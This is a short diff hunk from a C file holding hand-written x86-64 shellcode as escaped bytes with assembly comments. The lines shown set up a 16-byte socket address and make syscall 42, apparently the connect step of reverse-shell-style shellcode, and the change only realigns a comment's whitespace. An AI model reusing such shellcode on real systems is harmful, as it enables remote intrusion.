@@ -23,7 +23,7 @@ int main(void)
 	"\x52"		// push rdx
 	"\x52"		// push rdx
 	"\x48\x89\xe6"	// mov rsi, rsp
-	"\x48\xc7\xc2\x10\x00\x00\x00" // mov rdx, 0x10
+	"\x48\xc7\xc2\x10\x00\x00\x00"                  // mov rdx, 0x10
 	"\x6a\x2a"	// push 0x2a
 	"\x58"		// pop rax
 	"\x0f\x05"	// syscall
